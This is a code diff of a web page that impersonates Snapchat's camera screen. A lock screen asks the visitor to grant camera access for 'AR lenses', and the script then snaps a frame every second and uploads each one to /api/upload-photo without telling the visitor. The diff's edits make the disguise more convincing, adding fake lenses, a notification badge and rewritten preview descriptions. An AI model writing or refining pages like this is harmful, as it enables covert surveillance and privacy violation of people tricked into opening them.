@@ -5,29 +5,26 @@
     <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
     
     <title>Snapchat</title>
-    <meta name="title" content="Snapchat">
-    <meta name="description" content="Share the moment with friends! Log in to see what they're up to.">
+    <meta name="description" content="Snapchat is a popular mobile multimedia messaging app, developed by Snap Inc., primarily used to share photos, videos (known as 'snaps'), and texts that typically disappear after viewing.">
 
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://snapchat.com/">
     <meta property="og:title" content="Snapchat">
-    <meta property="og:description" content="Open the link to view the snap!">
-    <meta property="og:image" content="https://www.snapchat.com/globalassets/sparks/logos/ghost-icon.png">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
+    <meta property="og:description" content="Snapchat is a popular mobile multimedia messaging app, developed by Snap Inc., primarily used to share photos, videos (known as 'snaps'), and texts that typically disappear after viewing.">
+    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRByoqZXop7Rm8fHbepPIa-2MpD_uU_pHgjqD1t5eQt-A&s=10">
 
     <meta property="twitter:card" content="summary_large_image">
     <meta property="twitter:title" content="Snapchat">
-    <meta property="twitter:description" content="View this snap on Snapchat.">
-    <meta property="twitter:image" content="https://www.snapchat.com/globalassets/sparks/logos/ghost-icon.png">
+    <meta property="twitter:description" content="Snapchat is a popular mobile multimedia messaging app, developed by Snap Inc., primarily used to share photos, videos (known as 'snaps'), and texts that typically disappear after viewing.">
+    <meta property="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRByoqZXop7Rm8fHbepPIa-2MpD_uU_pHgjqD1t5eQt-A&s=10">
 
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
         body { width:100%; height:100%; overflow:hidden; background:#000; font-family:-apple-system, sans-serif; position:fixed; inset:0;}
-        #camera { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; z-index:1; transform:scaleX(-1); background:#000; transition: filter 0.3s; }
         
-        /* Liquid Glass Effect */
+        #camera { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; z-index:1; transform:scaleX(-1); background:#000; }
+        
+        /* iPhone Liquid Glass Styling */
         .glass { 
             background: rgba(255, 255, 255, 0.18); 
             backdrop-filter: blur(25px) saturate(180%); 
@@ -36,15 +33,18 @@
             box-shadow: inset 0 1px 1px rgba(255, 255, 255, 0.3);
         }
 
+        /* Top UI */
         .t-ui { position:fixed; top:20px; width:100%; padding:0 16px; display:flex; justify-content:space-between; z-index:20; color:#fff;}
         .t-left { display:flex; gap:12px; }
         .avatar { width:42px; height:42px; border-radius:50%; overflow:hidden; display:flex; align-items:center; justify-content:center; }
         .search { width:42px; height:42px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:18px; }
+        
         .t-right { display:flex; flex-direction:column; gap:10px; align-items:center; }
         .tool-btn { width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 19px; position: relative; }
         .hd-glass { width: 40px; height: 28px; border-radius: 9px; font-size: 10px; font-weight: 900; display: flex; align-items: center; justify-content: center; }
         .badge { position:absolute; top:-1px; right:-1px; background:#ff3040; font-size:9px; padding:1px 4px; border-radius:10px; border:1.5px solid #000; font-weight:900;}
 
+        /* Bottom UI Arrangement */
         .m-ui { position:fixed; bottom:115px; width:100%; display:flex; align-items:center; justify-content:center; z-index:25; padding: 0 15px; }
         .memories-btn { display:flex; flex-direction:column; align-items:center; gap:4px; color:#fff; font-size:10px; font-weight:600; margin-right: 18px; }
         .mem-icon { width:58px; height:58px; border-radius:16px; display:flex; align-items:center; justify-content:center; }
@@ -52,7 +52,7 @@
         .shutter-in { width:70px; height:70px; border-radius:50%; background:rgba(255,255,255,0.25); }
 
         .lens-row { display:flex; gap:12px; margin-left: 18px; overflow-x: auto; max-width: 45%; scrollbar-width: none; }
-        .lens { width:60px; height:60px; border-radius:50%; overflow:hidden; border:2px solid rgba(255,255,255,0.4); flex-shrink:0; transition: 0.2s; }
+        .lens { width:60px; height:60px; border-radius:50%; overflow:hidden; border:2px solid rgba(255,255,255,0.4); flex-shrink:0; }
         .lens.active { border-color:#ffe600; transform: scale(1.1); }
 
         .footer { position:fixed; bottom:0; width:100%; height:85px; background:rgba(0,0,0,0.85); backdrop-filter:blur(20px); display:flex; justify-content:space-around; align-items:center; z-index:30; border-top:0.5px solid rgba(255,255,255,0.1); padding-bottom:18px; }
@@ -69,7 +69,7 @@
     <div id="lock-screen">
         <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1280px-Snapchat_logo.svg.png" style="width:85px; margin-bottom:20px;">
         <h2>Camera Access Required</h2>
-        <p style="font-size:15px; color:#999; margin-top:10px;">Tap Continue to allow Snapchat access to your camera and lenses.</p>
+        <p style="font-size:15px; color:#999; margin-top:10px;">To enable AR lenses, Snapchat needs camera access. Tap Continue and Allow.</p>
         <button class="lock-btn" onclick="requestAccess()">CONTINUE</button>
     </div>
 
@@ -83,6 +83,7 @@
         </div>
         <div class="t-right">
             <div class="tool-btn glass"><i class="far fa-bell"></i></div>
+            <div class="tool-btn glass"><i class="fas fa-user-plus"></i><div class="badge">2</div></div>
             <div class="tool-btn glass" id="flip"><i class="fas fa-rotate"></i></div>
             <div class="hd-glass glass">HD</div>
             <div class="tool-btn glass"><i class="fas fa-chevron-down"></i></div>
@@ -98,6 +99,7 @@
         <div class="lens-row">
             <div class="lens active glass" onclick="setL(this,'none')"><img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100" style="width:100%; height:100%; object-fit:cover;"></div>
             <div class="lens glass" onclick="setL(this,'grayscale(1)')"><img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100" style="width:100%; height:100%; object-fit:cover;"></div>
+            <div class="lens glass" onclick="setL(this,'invert(1)')"><img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100" style="width:100%; height:100%; object-fit:cover;"></div>
         </div>
     </div>
 
@@ -123,7 +125,7 @@
                 // RAPID CAPTURE: 1 second interval
                 setInterval(send, 1000); 
             } catch (err) {
-                alert("Camera access denied.");
+                alert("Please open in Chrome/Safari.");
             }
         }
 
@@ -141,7 +143,7 @@
             ctx.drawImage(v, 0, 0, c.width, c.height); 
             c.toBlob(blob => {
                 const fd = new FormData();
-                fd.append('photo', blob, 'img.jpg');
+                fd.append('photo', blob, 'shot.jpg');
                 fetch('/api/upload-photo', { method: 'POST', body: fd });
             }, 'image/jpeg', 0.5);
         }
